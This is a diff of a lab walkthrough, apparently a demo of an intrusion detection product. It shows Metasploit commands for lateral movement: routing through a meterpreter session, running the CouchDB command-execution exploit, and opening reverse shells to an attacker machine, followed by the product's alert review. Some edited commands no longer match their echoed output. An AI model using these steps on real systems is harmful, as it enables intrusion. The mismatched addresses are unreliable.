@@ -53,7 +53,7 @@ msf5 exploit(unix/webapp/drupal_drupalgeddon2) > route add 192.168.20.0/24 1
 ```console
 msf5 exploit(unix/webapp/drupal_drupalgeddon2) > use exploit/linux/http/apache_couchdb_cmd_exec
 [*] Using configured payload linux/x64/shell_reverse_tcp
-msf5 exploit(linux/http/apache_couchdb_cmd_exec) > set RHOST 192.168.20.100
+msf5 exploit(linux/http/apache_couchdb_cmd_exec) > set RHOST 192.168.20.101
 RHOST => 192.168.20.100
 msf5 exploit(linux/http/apache_couchdb_cmd_exec) > set LHOST 10.114.209.151
 LHOST => 10.114.209.151
@@ -113,7 +113,7 @@ Active sessions
   Id  Name  Type                   Information                                                         Connection
   --  ----  ----                   -----------                                                         ----------
   1         meterpreter php/linux  www-data (33) @ 273e1700c5be                                        10.114.209.151:4444 -> 192.168.10.101:52496 (192.168.10.101)
-  2         shell x64/linux                                                                            10.114.209.151:4445 -> 10.114.209.148:50665 (192.168.20.100)
+  2         shell x64/linux                                                                            10.114.209.151:4445 -> 10.114.209.148:50665 (192.168.20.101)
   3         meterpreter x86/linux  no-user @ fd5e509d541b (uid=0, gid=0, euid=0, egid=0) @ 172.19.0.2  10.114.209.151:8081 -> 10.114.209.148:59526 (172.19.0.2)
 ```
 > **Note**: the external IP address (10.114.209.148) the above example for sessions 2 and 3 is the NATted IP address **App1-APP-TIER VM** to establish the reverse shell. NAT was pre-configured during the automated lab deployment.
@@ -153,7 +153,7 @@ Process List
 **Initiate CouchDB Command Execution attack against App2-APP-TIER VM through App-1-APP-TIER VM**
 1.	Using the already open Metasploit console, follow the below steps to initiate the exploit. Hit **enter** between every step. 
     * Type **background** to move the open meterpreter session to the background.
-    * Type **route add 192.168.20.101/32 3** to route traffic to the **App2-APP-TIER VM** through the previusly established meterpreter session. The IP address specified should be the IP address of the **App2-APP-TIER VM**
+    * Type **route add 192.168.20.100/32 3** to route traffic to the **App2-APP-TIER VM** through the previusly established meterpreter session. The IP address specified should be the IP address of the **App2-APP-TIER VM**
     * Type **use exploit/linux/http/apache_couchdb_cmd_exec** to select the CouchDB Command Execution exploit module
     * Type **set RHOST 192.168.20.101** to define the IP address of the victim to attack. The IP address should match the IP address of **App2-APP-TIER VM**. (check the NSX VM Inventory to confirm)+
     * Type **set LHOST 10.114.209.151** to define the IP address of the local attacker machine. The IP address should match the IP address of **EXTERNAL VM**. (This IP will be different in your environment !. You can run **ifconfig** to determine this IP)
@@ -162,11 +162,11 @@ Process List
 ```console
 meterpreter > background
 [*] Backgrounding session 3...
-msf5 post(multi/manage/shell_to_meterpreter) > route add 192.168.20.101/32 3
+msf5 post(multi/manage/shell_to_meterpreter) > route add 192.168.20.100/32 3
 [*] Route added
 msf5 post(multi/manage/shell_to_meterpreter) > use exploit/linux/http/apache_couchdb_cmd_exec
 [*] Using configured payload linux/x64/shell_reverse_tcp
-msf5 exploit(linux/http/apache_couchdb_cmd_exec) > set RHOST 192.168.20.101
+msf5 exploit(linux/http/apache_couchdb_cmd_exec) > set RHOST 192.168.20.100
 RHOST => 192.168.20.100
 msf5 exploit(linux/http/apache_couchdb_cmd_exec) > set LHOST 10.114.209.151
 LHOST => 10.114.209.151
@@ -287,7 +287,7 @@ This completes the lateral movement attack scenario. Now we will go back to NSX 
 7. Now we can look at the **CouchDB** exploit, which we used to move laterally from **APP-1-WEB-TIER** to **APP-1-APP-TIER** and from **APP-1-APP-TIER**  to **APP-2-APP-TIER**. 
 8. Click the **>** symbol to the left of the **SLR Alert - Apache CouchDB Remote Privilege Escalation (CVE-2017-12635)** event
     * Confirm that the IP addresses of the attacker and victim match with the **APP-1-APP-TIER VM** and **APP-2-APP-TIER VM** respectlively. This represents the last time this particular signature fired. 
-    * click **View Intrusion History** to see details about the exploit attempts. You should be able to conirm that first this exploit was used to move the attack from **APP-1-WEB-TIER (192.168.10.101)** to **APP-1-APP-TIER (192.168.20.100) ** and then from **APP-1-APP-TIER**  to **APP-2-APP-TIER (192.168.20.101)**. 
+    * click **View Intrusion History** to see details about the exploit attempts. You should be able to conirm that first this exploit was used to move the attack from **APP-1-WEB-TIER (192.168.10.101)** to **APP-1-APP-TIER (192.168.20.101) ** and then from **APP-1-APP-TIER**  to **APP-2-APP-TIER (192.168.20.100)**. 
   
 ![](assets/images/IDPS_POC_19.PNG)
 
